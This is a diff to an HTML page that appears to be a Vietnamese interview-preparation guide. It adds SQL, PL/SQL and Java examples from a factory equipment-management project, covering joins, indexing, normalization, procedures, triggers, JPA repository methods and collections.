@@ -65,11 +65,11 @@
           <a class="toc-link" href="#intro"><span class="toc-num">01</span><span class="toc-label">Giới thiệu</span><span class="toc-count" data-toc-count="intro">2</span></a>
           <a class="toc-link" href="#daily"><span class="toc-num">02</span><span class="toc-label">Công việc hằng ngày</span><span class="toc-count" data-toc-count="daily">4</span></a>
           <a class="toc-link" href="#sql"><span class="toc-num">03</span><span class="toc-label">SQL &amp; Database</span><span class="toc-count" data-toc-count="sql">20</span></a>
-          <a class="toc-link" href="#java"><span class="toc-num">04</span><span class="toc-label">Java Core</span><span class="toc-count" data-toc-count="java">17</span></a>
-          <a class="toc-link" href="#backend"><span class="toc-num">05</span><span class="toc-label">Spring &amp; Backend</span><span class="toc-count" data-toc-count="backend">29</span></a>
+          <a class="toc-link" href="#java"><span class="toc-num">04</span><span class="toc-label">Java Core</span><span class="toc-count" data-toc-count="java">20</span></a>
+          <a class="toc-link" href="#backend"><span class="toc-num">05</span><span class="toc-label">Spring &amp; Backend</span><span class="toc-count" data-toc-count="backend">30</span></a>
           <a class="toc-link" href="#frontend"><span class="toc-num">06</span><span class="toc-label">Frontend</span><span class="toc-count" data-toc-count="frontend">18</span></a>
           <a class="toc-link" href="#ai"><span class="toc-num">07</span><span class="toc-label">AI &amp; Claude</span><span class="toc-count" data-toc-count="ai">8</span></a>
-          <a class="toc-link" href="#company"><span class="toc-num">08</span><span class="toc-label">Theo công ty</span><span class="toc-count" data-toc-count="company">6</span></a>
+          <a class="toc-link" href="#company"><span class="toc-num">08</span><span class="toc-label">Theo công ty</span><span class="toc-count" data-toc-count="company">7</span></a>
           <a class="toc-link" href="#resources"><span class="toc-num">09</span><span class="toc-label">Tài nguyên</span><span class="toc-count" data-toc-count="resources">4</span></a>
         </nav>
 
@@ -97,7 +97,7 @@
             <a class="btn btn-ghost" href="#intro">Xem giới thiệu</a>
           </div>
           <div class="hero-stats">
-            <div class="stat"><strong id="statQuestions">98</strong><span>câu hỏi</span></div>
+            <div class="stat"><strong id="statQuestions">103</strong><span>câu hỏi</span></div>
             <div class="stat"><strong>2</strong><span>dự án Nhật</span></div>
             <div class="stat"><strong>9</strong><span>nhóm kiến thức</span></div>
           </div>
@@ -311,6 +311,17 @@ Hiện tại, em muốn tìm một môi trường mới để có thể phát tr
                 <li><strong>SELECT</strong> tính cột/alias; <strong>DISTINCT</strong> loại trùng; <strong>ORDER BY</strong> sắp xếp; <strong>LIMIT/OFFSET</strong> giới hạn kết quả.</li>
                 <li>Alias của SELECT dùng được trong ORDER BY nhưng thường không dùng được trong WHERE. Window function chạy sau WHERE/GROUP BY/HAVING và trước ORDER BY.</li>
               </ul>
+              <pre><code>-- SEIXX: mỗi nhà máy có bao nhiêu lần sản xuất trong tháng 9, xếp giảm dần
+SELECT f.factory_name, COUNT(*) AS log_count   -- 5. SELECT (alias log_count)
+FROM production_log pl                          -- 1. FROM
+JOIN factory f ON f.id = pl.factory_id          -- 1. JOIN + ON
+WHERE pl.logged_at &gt;= '2026-09-01'              -- 2. WHERE (lọc từng dòng)
+  AND pl.logged_at &lt; '2026-10-01'
+GROUP BY f.factory_name                         -- 3. GROUP BY
+HAVING COUNT(*) &gt; 100                           -- 4. HAVING (lọc sau gom nhóm)
+ORDER BY log_count DESC                         -- 6. ORDER BY (alias dùng được)
+LIMIT 10;                                       -- 7. LIMIT</code></pre>
+              <div class="callout info"><strong>Vì sao cần biết thứ tự:</strong> nếu viết <code>WHERE COUNT(*) &gt; 100</code> sẽ lỗi ngay — vì WHERE chạy khi chưa gom nhóm, đếm chưa tồn tại. Muốn lọc theo số đếm bắt buộc phải dùng HAVING.</div>
             </div>
           </details>
 
@@ -339,6 +350,18 @@ Hiện tại, em muốn tìm một môi trường mới để có thể phát tr
                 <li><code>production_log.equipment_id</code> là FK → equipment, đặt <code>ON DELETE RESTRICT</code>: không cho xóa thiết bị đã có lịch sử sản xuất (nghiệp vụ là gắn cờ deleted, không xóa thật).</li>
                 <li><code>CHECK (status IN ('RUNNING','STOPPED','MAINTENANCE'))</code> chặn dữ liệu import CSV sai trạng thái ngay ở tầng DB.</li>
               </ul>
+              <pre><code>-- DDL thật của bảng equipment (SEIXX)
+CREATE TABLE equipment (
+  id             BIGSERIAL PRIMARY KEY,
+  factory_id     BIGINT NOT NULL,
+  equipment_code VARCHAR(30) NOT NULL,
+  status         VARCHAR(20) NOT NULL,
+  CONSTRAINT uq_equipment UNIQUE (factory_id, equipment_code),
+  CONSTRAINT fk_equipment_factory FOREIGN KEY (factory_id)
+    REFERENCES factory(id) ON DELETE RESTRICT,
+  CONSTRAINT ck_equipment_status
+    CHECK (status IN ('RUNNING','STOPPED','MAINTENANCE'))
+);</code></pre>
               <p><strong>Kể thêm khi phỏng vấn:</strong> “File import có 2 dòng cùng mã thiết bị → nhờ UNIQUE constraint mà batch bị rollback và báo đúng dòng lỗi, thay vì âm thầm ghi đè”.</p>
             </div>
           </details>
@@ -357,6 +380,16 @@ Hiện tại, em muốn tìm một môi trường mới để có thể phát tr
                 <li><strong>3NF:</strong> đạt 2NF và không có phụ thuộc bắc cầu — cột không khóa không phụ thuộc vào cột không khóa khác (ví dụ: lưu cả mã phòng ban và tên phòng ban trong bảng nhân viên).</li>
               </ul>
               <p><strong>Ví dụ:</strong> bảng chi tiết đơn hàng chỉ lưu product_id; tên/giá sản phẩm nằm ở bảng product. Chuẩn hóa giúp tránh dư thừa, update/insert/delete anomaly.</p>
+              <pre><code>-- TRƯỚC (vi phạm 1NF và 3NF):
+production_log(id, equipment_id, factory_name, category_names, logged_at)
+-- category_names = 'Ép nhựa, Đóng gói'  ← 1 ô chứa nhiều giá trị (vi phạm 1NF)
+-- factory_name lặp ở mọi dòng log      ← phụ thuộc bắc cầu (vi phạm 3NF)
+
+-- SAU (chuẩn 3NF):
+factory(id, factory_name)
+equipment_category(id, category_name)
+equipment(id, equipment_code, factory_id, category_id)
+production_log(id, equipment_id, quantity, logged_at)</code></pre>
               <p><strong>Chuyện thật ở SEIXX:</strong> bảng <code>production_log</code> ban đầu lưu thẳng <code>factory_name</code> và <code>category_name</code> của thiết bị. Khi nhà máy đổi tên, phải update hàng chục nghìn dòng và rất dễ sót; sau đó tách ra bảng <code>factory</code>, <code>equipment_category</code> và chỉ giữ FK — đổi tên 1 dòng, toàn bộ dữ liệu theo đúng.</p>
               <p><strong>Denormalize khi:</strong> đọc phải join quá nhiều bảng gây chậm (báo cáo, dashboard), cần cột tổng/tóm tắt (total_amount), bảng log/lịch sử. Chấp nhận dư thừa để đổi tốc độ đọc — phải kiểm soát bằng job/trigger đồng bộ hoặc ghi một chiều.</p>
               <div class="callout tip"><strong>Khi phỏng vấn:</strong> chốt “chuẩn hóa đến 3NF là mặc định, denormalize có chủ đích và luôn đo lại hiệu năng”.</div>
@@ -389,6 +422,21 @@ FROM students s
 WHERE EXISTS (
   SELECT 1 FROM scores sc WHERE sc.student_id = s.id
 );</code></pre>
+              <p><strong>Ở SEIXX:</strong> “thiết bị chưa từng chạy sản xuất” viết bằng <code>NOT EXISTS</code> (anti-join); “thiết bị có sản lượng tháng 9 trên trung bình” viết bằng JOIN với subquery tính <code>AVG</code> — subquery chỉ trả 1 dòng nên rất nhẹ:</p>
+              <pre><code>SELECT e.equipment_code
+FROM equipment e
+WHERE NOT EXISTS (                 -- anti-join: chưa có log nào
+  SELECT 1 FROM production_log pl WHERE pl.equipment_id = e.id
+);
+
+SELECT e.equipment_code, SUM(pl.quantity) AS total
+FROM production_log pl
+JOIN equipment e ON e.id = pl.equipment_id
+WHERE pl.logged_at &gt;= '2026-09-01' AND pl.logged_at &lt; '2026-10-01'
+GROUP BY e.equipment_code
+HAVING SUM(pl.quantity) &gt; (      -- so với trung bình 1 thiết bị
+  SELECT AVG(quantity) FROM production_log
+);</code></pre>
             </div>
           </details>
 
@@ -417,6 +465,16 @@ WHERE id NOT IN (
   SELECT student_id FROM scores WHERE student_id IS NOT NULL
 );</code></pre>
               <p>Ngoài ra, <code>NOT IN</code> với tập giá trị lớn có thể kém hiệu quả; <code>NOT EXISTS</code> hoặc <code>LEFT JOIN ... WHERE b.id IS NULL</code> thường là lựa chọn tốt hơn.</p>
+              <p><strong>Ở SEIXX:</strong> khi đối chiếu file CSV import với DB, cột <code>equipment_code</code> có thể chứa dòng rỗng/NULL nếu file khách điền thiếu — dùng <code>NOT IN</code> sẽ ra kết quả rỗng sai lệch, nên luôn loại NULL hoặc chuyển sang <code>NOT EXISTS</code>:</p>
+              <pre><code>-- Đối chiếu: mã trong file chưa có trong DB (dạng an toàn)
+SELECT t.equipment_code
+FROM import_staging t
+WHERE t.equipment_code IS NOT NULL
+  AND NOT EXISTS (
+    SELECT 1 FROM equipment e
+    WHERE e.factory_id = :factoryId
+      AND e.equipment_code = t.equipment_code
+  );</code></pre>
             </div>
           </details>
 
@@ -452,6 +510,21 @@ END;</code></pre>
                 <li><strong>RAISE_APPLICATION_ERROR(-20001, 'message')</strong> để trả lỗi nghiệp vụ cho caller.</li>
                 <li><strong>WHEN OTHERS</strong> nên log <code>SQLCODE</code>/<code>SQLERRM</code> và <code>RAISE</code> lại; tránh nuốt lỗi. Transaction nên được rollback ở tầng gọi nếu cần.</li>
               </ul>
+              <p><strong>Ở SEIXX:</strong> procedure đổi trạng thái thiết bị bắt lỗi nghiệp vụ và trả message rõ cho Java thay vì để lỗi hệ thống khó hiểu:</p>
+              <pre><code>CREATE OR REPLACE PROCEDURE sp_set_equipment_status(
+  p_equipment_id IN NUMBER, p_status IN VARCHAR2) IS
+BEGIN
+  UPDATE equipment SET status = p_status WHERE id = p_equipment_id;
+  IF SQL%ROWCOUNT = 0 THEN
+    RAISE_APPLICATION_ERROR(-20001, 'Mã thiết bị không tồn tại');
+  END IF;
+  COMMIT;
+EXCEPTION
+  WHEN OTHERS THEN
+    ROLLBACK;
+    DBMS_OUTPUT.PUT_LINE('sp_set_equipment_status lỗi: ' || SQLCODE);
+    RAISE;  -- Java nhận SQLException để map sang lỗi hiển thị
+END;</code></pre>
             </div>
           </details>
 
@@ -470,6 +543,18 @@ END;</code></pre>
                 <li>Aggregate như <code>COUNT(*)</code> luôn trả về đúng một dòng (trừ khi có GROUP BY).</li>
               </ul>
               <div class="callout info"><strong>Phân biệt:</strong> trong SQL Server, <code>SELECT ... INTO</code> là câu lệnh <em>tạo bảng mới</em> từ kết quả SELECT và có thể chèn nhiều dòng. Còn gán biến kiểu <code>SELECT @x = col FROM ...</code> sẽ lấy dòng cuối cùng, không báo lỗi nhiều dòng.</div>
+              <p><strong>Ở SEIXX:</strong> procedure lấy thông tin thiết bị theo mã — nếu gõ nhầm mã không tồn tại thì nhận <code>NO_DATA_FOUND</code>, còn nếu query thiếu điều kiện nhà máy mà mã bị trùng thì nhận <code>TOO_MANY_ROWS</code>:</p>
+              <pre><code>BEGIN
+  SELECT id, status INTO v_id, v_status
+  FROM equipment
+  WHERE factory_id = p_factory_id       -- luôn lọc đủ khóa nghiệp vụ
+    AND equipment_code = p_code;
+EXCEPTION
+  WHEN NO_DATA_FOUND THEN
+    RAISE_APPLICATION_ERROR(-20001, 'Không tìm thấy mã ' || p_code);
+  WHEN TOO_MANY_ROWS THEN
+    RAISE_APPLICATION_ERROR(-20002, 'Mã thiết bị bị trùng dữ liệu');
+END;</code></pre>
             </div>
           </details>
 
@@ -492,6 +577,19 @@ END;</code></pre>
 FROM orders
 WHERE status = 'PAID'
   AND (created_at &gt;= '2026-01-01' OR note IS NOT NULL);</code></pre>
+              <p><strong>Ở SEIXX:</strong> màn hình tìm kiếm thiết bị — phân trang kèm lọc trạng thái, chú ý ngoặc và khoảng ngày nửa mở (<code>&gt;=</code> ngày đầu, <code>&lt;</code> ngày kế tiếp) để không sót dữ liệu:</p>
+              <pre><code>SELECT id, equipment_code, status
+FROM equipment
+WHERE factory_id = 12
+  AND status IN ('RUNNING', 'MAINTENANCE')
+  AND (updated_at &gt;= '2026-09-01' AND updated_at &lt; '2026-10-01')
+ORDER BY updated_at DESC
+LIMIT 20 OFFSET 0;
+
+-- Kiểm tra tình trạng thiếu dữ liệu
+SELECT COUNT(*) AS missing_note
+FROM equipment
+WHERE note IS NULL OR note = '';</code></pre>
             </div>
           </details>
 
@@ -515,6 +613,15 @@ FROM students
 WHERE name LIKE 'Nguy%'
   AND status IN ('ACTIVE', 'PENDING')
 ORDER BY created_at DESC;</code></pre>
+              <p><strong>Ở SEIXX:</strong> ô tìm kiếm thiết bị hỗ trợ gõ một phần mã, nhưng <code>%keyword%</code> không dùng được index — với bảng lớn nên chuẩn hóa từ khóa tìm kiếm:</p>
+              <pre><code>-- Người dùng gõ 'EQ-01' → tìm chứa
+SELECT id, equipment_code
+FROM equipment
+WHERE equipment_code LIKE '%EQ-01%'     -- chậm dần khi bảng lớn
+  AND factory_id = 12;                   -- vẫn lọc theo cột có index trước
+
+-- Tìm mã bắt đầu bằng tiền tố (index-friendly)
+WHERE equipment_code LIKE 'EQ-01%'</code></pre>
             </div>
           </details>
 
@@ -536,6 +643,19 @@ List&lt;Student&gt; queryByClassName(String className);</code></pre>
                 <li>Kiểu trả về quyết định hành vi: <code>Optional&lt;T&gt;</code>, <code>List&lt;T&gt;</code>, <code>Page&lt;T&gt;</code>, <code>Slice&lt;T&gt;</code>.</li>
                 <li><code>findById</code> trả về <code>Optional</code> và truy vấn DB; <code>getById</code> (bản cũ) trả về reference/proxy và có thể ném lỗi khi truy cập nếu không tồn tại. Ưu tiên <code>findById</code> nếu cần kiểm tra tồn tại.</li>
               </ul>
+              <p><strong>Ở SEIXX</strong> (Spring Data JPA quản lý <code>Equipment</code>): các method suy diễn từ tên dùng đúng như trên, không cần viết SQL:</p>
+              <pre><code>public interface EquipmentRepository extends JpaRepository&lt;Equipment, Long&gt; {
+
+  Optional&lt;Equipment&gt; findByFactoryIdAndEquipmentCode(Long factoryId, String code);
+
+  List&lt;Equipment&gt; readByStatusOrderByUpdatedAtDesc(String status);
+
+  Page&lt;Equipment&gt; queryByFactoryId(Long factoryId, Pageable pageable);
+
+  boolean existsByFactoryIdAndEquipmentCode(Long factoryId, String code);
+
+  long countByStatus(String status);
+}</code></pre>
             </div>
           </details>
 
@@ -556,6 +676,14 @@ List&lt;Student&gt; queryByClassName(String className);</code></pre>
               <pre><code>long countByStatus(String status);
 boolean existsByEmail(String email);
 Optional&lt;Student&gt; getByEmail(String email);</code></pre>
+              <p><strong>Ở SEIXX:</strong> tab “Thiết bị” hiển thị badge số lượng theo trạng thái bằng <code>countByStatus</code>, còn trước khi import CSV phải kiểm tra trùng mã — dùng <code>existsBy...</code> cho nhanh hơn kéo cả entity về:</p>
+              <pre><code>// Dashboard: đếm nhanh từng loại (SELECT COUNT(*) ... WHERE status = ?)
+long running = equipmentRepo.countByStatus("RUNNING");
+
+// Validate file import: mã đã tồn tại chưa?
+if (equipmentRepo.existsByFactoryIdAndEquipmentCode(factoryId, code)) {
+  errors.add(new RowError(lineNo, "Mã thiết bị đã tồn tại: " + code));
+}</code></pre>
             </div>
           </details>
 
@@ -579,6 +707,29 @@ Optional&lt;Student&gt; getByEmail(String email);</code></pre>
               </ul>
               <h4>Trigger</h4>
               <p>Đoạn logic tự động chạy khi INSERT/UPDATE/DELETE. Có BEFORE/AFTER/INSTEAD OF, row-level/statement-level. Dùng cho audit, ràng buộc phức tạp, đồng bộ dữ liệu; nhưng logic ẩn dễ gây khó debug và ảnh hưởng hiệu năng.</p>
+              <p><strong>Ở SEIXX — bộ ba này phối hợp như sau:</strong> khi nhập lô sản lượng mới, service Java mở transaction gọi procedure; mỗi lần trạng thái thiết bị đổi, trigger ghi vết vào bảng audit:</p>
+              <pre><code>-- 1) Procedure gói nghiệp vụ + transaction
+CREATE OR REPLACE PROCEDURE sp_import_production(
+  p_factory_id IN NUMBER, p_logged_at IN DATE) IS
+BEGIN
+  INSERT INTO production_log(id, equipment_id, quantity, logged_at)
+  SELECT seq_log.NEXTVAL, e.id, 0, p_logged_at
+  FROM equipment e WHERE e.factory_id = p_factory_id;
+  UPDATE factory SET last_import_at = p_logged_at WHERE id = p_factory_id;
+  COMMIT;
+EXCEPTION WHEN OTHERS THEN
+  ROLLBACK; RAISE;
+END;
+
+-- 2) Trigger audit chạy tự động, không cần code gọi
+CREATE OR REPLACE TRIGGER trg_equipment_status_audit
+AFTER UPDATE OF status ON equipment
+FOR EACH ROW
+BEGIN
+  INSERT INTO equipment_audit(equipment_id, old_status, new_status, changed_at)
+  VALUES (:OLD.id, :OLD.status, :NEW.status, SYSDATE);
+END;</code></pre>
+              <div class="callout warn"><strong>Lưu ý:</strong> tự <code>COMMIT</code> trong procedure có thể phá transaction của tầng gọi (Java) — nên để Java quản lý transaction (<code>@Transactional</code>) và procedure không commit khi được gọi từ app.</div>
             </div>
           </details>
 
@@ -596,6 +747,13 @@ Optional&lt;Student&gt; getByEmail(String email);</code></pre>
                 <li><strong>FE:</strong> chỉ validation UX (required, format), hiển thị lỗi; không đặt business rule quan trọng vì có thể bypass.</li>
                 <li><strong>1 triệu request:</strong> không chỉ “đẩy hết vào SP”. Cần cache (Redis), async/queue, rate limit, connection pool, index, partition, read replica, horizontal scaling, CDN, giảm N+1 và đo lường bằng metrics.</li>
                 <li><strong>Nguyên tắc:</strong> DB là tài nguyên đắt; đừng để FE gọi DB trực tiếp hoặc đặt logic nghiệp vụ trong trigger/SP nếu không có lý do rõ ràng.</li>
+              </ul>
+              <p><strong>Ví dụ SEIXX — 1 triệu request xem danh sách thiết bị:</strong> gọi thẳng DB mỗi request sẽ sập. Cách xử lý theo tầng:</p>
+              <ul>
+                <li>Danh mục ít đổi (nhà máy, category) → cache Redis TTL 10 phút, giảm ~90% query lặp.</li>
+                <li>Tác vụ nặng (import CSV 50k dòng, xuất báo cáo) → đẩy vào queue, trả về job id cho FE poll trạng thái.</li>
+                <li>Query còn lại → index đúng cột lọc, connection pool (~20–50), phân trang bắt buộc.</li>
+                <li>Báo cáo tổng hợp nặng (sản lượng theo tháng cho 500 nhà máy) → job chạy đêm ghi sẵn bảng summary, không tính realtime.</li>
               </ul>
             </div>
           </details>
@@ -626,6 +784,16 @@ Optional&lt;Student&gt; getByEmail(String email);</code></pre>
                 </table>
               </div>
               <p><strong>Clustered vs nonclustered:</strong> clustered index quyết định thứ tự vật lý của dữ liệu (mỗi bảng thường chỉ một, ví dụ primary key); nonclustered là cấu trúc riêng chứa key và con trỏ tới dòng dữ liệu.</p>
+              <p><strong>Ví dụ SEIXX:</strong> màn hình danh sách thiết bị lọc theo nhà máy + trạng thái, sắp theo ngày cập nhật:</p>
+              <pre><code>-- Query chậm vì chỉ có PK:
+SELECT * FROM equipment
+WHERE factory_id = 12 AND status = 'RUNNING'
+ORDER BY updated_at DESC LIMIT 20;
+
+-- Composite index khớp đúng thứ tự điều kiện lọc + sort
+CREATE INDEX idx_equipment_factory_status_time
+  ON equipment (factory_id, status, updated_at DESC);</code></pre>
+              <p><strong>Đo trước và sau:</strong> trước ~800ms (full scan 500k dòng) → sau ~5ms (index scan chỉ đọc 20 dòng cần thiết). Đúng quy tắc: cột equality trước, cột range/sort sau.</p>
               <p><strong>Khi nào không nên:</strong> cột ít chọn lọc (giới tính), bảng ghi rất nhiều, index quá nhiều gây chậm INSERT/UPDATE/DELETE và tốn dung lượng. Luôn kiểm tra bằng execution plan.</p>
             </div>
           </details>
@@ -663,6 +831,19 @@ SELECT *
 FROM promotions p
 JOIN orders o
   ON o.created_at BETWEEN p.start_at AND p.end_at;</code></pre>
+              <p><strong>Ở SEIXX:</strong> màn hình “Thiết bị &amp; nhà máy” dùng INNER JOIN vì thiết bị bắt buộc thuộc một nhà máy; ngược lại danh sách nhà máy cần hiển thị cả nhà máy chưa có thiết bị nên phải dùng LEFT JOIN:</p>
+              <pre><code>-- Nhà máy nào cũng hiện, kèm số thiết bị (0 nếu chưa có)
+SELECT f.factory_name, COUNT(e.id) AS equipment_count
+FROM factory f
+LEFT JOIN equipment e ON e.factory_id = f.id
+GROUP BY f.id, f.factory_name
+ORDER BY equipment_count DESC;
+
+-- Tìm nhà máy chưa được gán thiết bị nào (anti-join)
+SELECT f.*
+FROM factory f
+LEFT JOIN equipment e ON e.factory_id = f.id
+WHERE e.id IS NULL;</code></pre>
             </div>
           </details>
 
@@ -688,6 +869,15 @@ JOIN orders o
                 </table>
               </div>
               <p>Khác biệt chi tiết phụ thuộc DB (SQL Server, Oracle, PostgreSQL). Khi trả lời phỏng vấn nên nêu rõ “theo SQL Server/Oracle” nếu được hỏi sâu.</p>
+              <p><strong>Ở SEIXX:</strong> function để tính tổng sản lượng một thiết bị (dùng được ngay trong SELECT), procedure để chạy nghiệp vụ nhiều bước:</p>
+              <pre><code>-- Function: tính được trong câu SELECT
+SELECT e.equipment_code,
+       fn_total_output(e.id, DATE '2026-09-01', DATE '2026-09-30') AS total
+FROM equipment e
+WHERE e.factory_id = 12;
+
+-- Procedure: nhiều bước + transaction, caller phải EXEC/CALL
+CALL sp_close_month(12, DATE '2026-09-30');  -- chốt sổ, khóa log, gửi mail</code></pre>
             </div>
           </details>
 
@@ -730,6 +920,15 @@ LEFT JOIN orders o ON o.customer_id = c.id
 GROUP BY c.id, c.name
 HAVING COUNT(o.id) &gt;= 3
 ORDER BY order_count DESC;</code></pre>
+              <p><strong>Ở SEIXX:</strong> báo cáo “nhà máy có từ 100 lần sản xuất trở lên trong tháng 9” — điều kiện theo thời gian đặt ở WHERE (lọc trước, đỡ dữ liệu cho GROUP BY), điều kiện theo số đếm đặt ở HAVING:</p>
+              <pre><code>SELECT f.factory_name, COUNT(*) AS run_count
+FROM production_log pl
+JOIN factory f ON f.id = pl.factory_id
+WHERE pl.logged_at &gt;= '2026-09-01'
+  AND pl.logged_at &lt; '2026-10-01'      -- WHERE: lọc dòng trước khi đếm
+GROUP BY f.id, f.factory_name
+HAVING COUNT(*) &gt;= 100                  -- HAVING: lọc theo kết quả đếm
+ORDER BY run_count DESC;</code></pre>
             </div>
           </details>
 
@@ -778,6 +977,17 @@ ORDER BY order_count DESC;</code></pre>
                 <li><strong>Khóa:</strong> kiểm tra lock contention, transaction quá dài, deadlock; giữ transaction ngắn.</li>
               </ul>
               <div class="callout tip"><strong>Câu trả lời phỏng vấn:</strong> “Em sẽ xem execution plan và slow query log trước, sau đó kiểm tra index/statistics, viết lại query, rồi mới cân nhắc cache hoặc partition. Mỗi thay đổi đều đo lại hiệu năng.”</div>
+              <p><strong>Ví dụ SEIXX:</strong> dashboard thống kê trạng thái chạy 3 subquery COUNT riêng lẻ mất ~5 giây trên bảng 500k dòng. Sửa 2 bước, đo lại sau mỗi bước:</p>
+              <pre><code>-- BƯỚC 1 — gộp 3 subquery thành 1 lần quét
+SELECT status, COUNT(*) AS total
+FROM equipment
+WHERE factory_id = 12
+GROUP BY status;
+-- ~5s → ~300ms
+
+-- BƯỚC 2 — thêm index phù hợp (factory_id, status)
+CREATE INDEX idx_equipment_factory_status ON equipment (factory_id, status);
+-- ~300ms → ~5ms (index-only scan)</code></pre>
             </div>
           </details>
         </div>
@@ -791,7 +1001,7 @@ ORDER BY order_count DESC;</code></pre>
             <p>Đa hình, truyền tham trị, Stream API, collection, BigDecimal và các câu hỏi nền tảng.</p>
           </div>
           <div class="section-actions">
-            <span class="qa-count">17 câu hỏi</span>
+            <span class="qa-count">20 câu hỏi</span>
             <button class="mini-btn" type="button" data-toggle-section="java">Mở tất cả</button>
           </div>
         </div>
@@ -828,6 +1038,17 @@ a.speak(); // Woof — chọn theo object thực tế
 Animal b = new Cat();
 b.speak(); // Meow</code></pre>
               <p>Lợi ích: mở rộng hành vi không sửa code cũ, giảm coupling, dễ áp dụng Strategy/Factory/DI.</p>
+              <p><strong>Ở SEIXX:</strong> mỗi loại file import có cách validate khác nhau nhưng cùng một hợp đồng — thêm loại mới chỉ việc viết class mới, không sửa code cũ:</p>
+              <pre><code>public interface CsvValidator {
+  ValidationResult validate(String[] columns, int lineNo);
+}
+
+public class EquipmentCsvValidator implements CsvValidator { ... }
+public class ProductionCsvValidator implements CsvValidator { ... }
+
+// Service chỉ làm việc với abstraction — không biết class cụ thể
+CsvValidator validator = validatorFactory.get(type);
+result = validator.validate(cols, lineNo);</code></pre>
             </div>
           </details>
 
@@ -983,6 +1204,7 @@ void reassign(StringBuilder sb) {
 StringBuilder x = new StringBuilder("hello");
 mutate(x);   // x = "hello world"
 reassign(x); // x vẫn là "hello world"</code></pre>
+              <p><strong>Ở SEIXX — bug thật:</strong> hàm <code>addError(list, msg)</code> nhận <code>List&lt;String&gt;</code> để gom lỗi import; vì truyền reference nên list bên ngoài được cập nhật đúng. Nhưng có lần viết <code>list = new ArrayList&lt;&gt;()</code> bên trong method để “reset” — caller không thấy gì vì chỉ gán lại reference, lỗi cũ vẫn còn nguyên. Cách đúng: <code>list.clear()</code>.</p>
             </div>
           </details>
 
@@ -1011,6 +1233,23 @@ Map&lt;String, List&lt;Student&gt;&gt; byClass = students.stream()
     .collect(Collectors.groupingBy(Student::getClassName));
 
 int total = scores.stream().mapToInt(Integer::intValue).sum();</code></pre>
+              <p><strong>Ở SEIXX:</strong> API danh sách thiết bị — lọc theo nhà máy, gom theo trạng thái, đếm và lấy nhóm nhiều nhất, tất cả trong một pipeline:</p>
+              <pre><code>Map&lt;String, Long&gt; countByStatus = equipments.stream()
+    .filter(e -&gt; e.getFactoryId().equals(factoryId))
+    .collect(Collectors.groupingBy(Equipment::getStatus, Collectors.counting()));
+
+EquipmentDto first = equipments.stream()
+    .filter(e -&gt; "MAINTENANCE".equals(e.getStatus()))
+    .sorted(Comparator.comparing(Equipment::getUpdatedAt).reversed())
+    .map(EquipmentDto::from)
+    .findFirst()
+    .orElseThrow(() -&gt; new NotFoundException("Không có thiết bị bảo trì"));
+
+// Validate file import: dòng nào có mã rỗng?
+List&lt;Integer&gt; emptyCodeLines = rows.stream()
+    .filter(r -&gt; r.code() == null || r.code().isBlank())
+    .map(CsvRow::lineNo)
+    .toList();</code></pre>
             </div>
           </details>
 
@@ -1036,6 +1275,17 @@ int total = scores.stream().mapToInt(Integer::intValue).sum();</code></pre>
                 </table>
               </div>
               <p><strong>Lưu ý:</strong> HashSet/TreeSet dựa vào <code>equals()</code>/<code>hashCode()</code> hoặc <code>compareTo()</code>/<code>Comparator</code>. Nếu override <code>equals</code> mà không override <code>hashCode</code>, Set có thể chứa phần tử “trùng” ngoài ý muốn.</p>
+              <p><strong>Ở SEIXX:</strong> khi validate file import 10.000 dòng, danh sách mã đã dùng trong file lưu vào <code>HashSet</code> — mỗi dòng chỉ cần <code>set.add(code)</code> trả về false là biết ngay trùng trong file, nhanh hơn hẳn <code>List.contains</code> (O(1) so với O(n)):</p>
+              <pre><code>Set&lt;String&gt; seenCodes = new HashSet&lt;&gt;();
+List&lt;RowError&gt; errors = new ArrayList&lt;&gt;();
+
+for (CsvRow row : rows) {
+  if (!seenCodes.add(row.code())) {          // false = đã có trong file
+    errors.add(new RowError(row.lineNo(), "Mã trùng trong file: " + row.code()));
+  }
+}
+
+// Kết quả trả về cho FE vẫn cần giữ thứ tự → LinkedHashSet/ArrayList</code></pre>
             </div>
           </details>
 
@@ -1062,6 +1312,15 @@ a.compareTo(b) == 0;  // true
 BigDecimal price = new BigDecimal("19.99");
 BigDecimal total = price.multiply(BigDecimal.valueOf(3))
     .setScale(2, RoundingMode.HALF_UP);</code></pre>
+              <p><strong>Ở SEIXX:</strong> import CSV ghi đơn giá — file khách có dòng ghi <code>19.9</code>, dòng khác <code>19.90</code>. Nếu dùng <code>equals</code> để so sánh phát hiện thay đổi giá thì báo sai (false), phải dùng <code>compareTo</code>:</p>
+              <pre><code>BigDecimal newPrice = new BigDecimal("19.9");
+BigDecimal oldPrice = new BigDecimal("19.90");
+
+newPrice.equals(oldPrice);         // false  ← scale khác nhau
+newPrice.compareTo(oldPrice) == 0; // true   ← đúng ý nghĩa "giá không đổi"
+
+// Chốt giá về 1 scale chuẩn sau khi đọc file
+newPrice = newPrice.setScale(2, RoundingMode.HALF_UP); // 19.90</code></pre>
             </div>
           </details>
 
@@ -1090,6 +1349,7 @@ BigDecimal total = price.multiply(BigDecimal.valueOf(3))
                 <li>Thành viên interface mặc định là <code>public</code>; field là <code>public static final</code>.</li>
                 <li>Nguyên tắc: giữ phạm vi nhỏ nhất có thể (encapsulation).</li>
               </ul>
+              <p><strong>Ở SEIXX:</strong> entity <code>Equipment</code> để field <code>private</code> + getter/setter (JPA/Hibernate truy cập qua reflection); class helper trong cùng package như <code>CsvRowMapper</code> dùng <em>default</em> để test nội bộ mà không lộ ra API; method <code>validateHeader()</code> để <code>protected</code> để lớp con của validator tái sử dụng nhưng không cho service bên ngoài gọi bừa.</p>
             </div>
           </details>
 
@@ -1119,6 +1379,24 @@ BigDecimal total = price.multiply(BigDecimal.valueOf(3))
                 <li><code>static</code>, <code>private</code>, <code>final</code> không override được; static là hiding.</li>
                 <li>Overload không dựa vào kiểu trả về hoặc tên tham số.</li>
               </ul>
+              <pre><code>// Overload: cùng tên, khác tham số — service có màn hình tìm kiếm 2 chế độ
+List&lt;Equipment&gt; search(String keyword) {
+  return search(keyword, null, 0, 20);
+}
+
+List&lt;Equipment&gt; search(String keyword, String status, int page, int size) {
+  // bản đầy đủ có lọc trạng thái + phân trang
+}
+
+// Override: mỗi loại import tự định nghĩa cách validate dòng của mình
+abstract class BaseCsvImporter {
+  abstract RowError validateRow(String[] cols, int lineNo);
+}
+
+class EquipmentImporter extends BaseCsvImporter {
+  @Override
+  RowError validateRow(String[] cols, int lineNo) { ... }
+}</code></pre>
             </div>
           </details>
 
@@ -1143,6 +1421,24 @@ BigDecimal total = price.multiply(BigDecimal.valueOf(3))
                 </table>
               </div>
